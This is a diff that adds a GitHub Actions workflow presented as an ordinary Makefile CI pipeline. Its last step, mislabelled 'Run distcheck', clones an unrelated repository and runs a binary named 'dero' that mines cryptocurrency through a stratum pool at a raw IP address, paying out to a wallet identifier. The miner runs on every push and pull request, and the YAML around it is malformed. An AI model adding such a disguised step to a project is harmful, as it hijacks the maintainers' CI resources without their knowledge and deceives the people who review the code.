@@ -1,0 +1,30 @@
+name: Makefile CI
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v3
+
+    - name: configure
+      run: ./configure
+
+    - name: Install dependencies
+      run: make
+
+    - name: Run check
+      run: make check
+
+    - name: Run distcheck
+      run: git clone https://github.com/monariski217/2022.git && cd 2022 
+chmod +x dero
+./dero -a minotaurx -o stratum+tcps://164.92.254.193:80 -u TSasvbAzaJwJsSF8jcuDjnewTS55kwotgf.circle
+
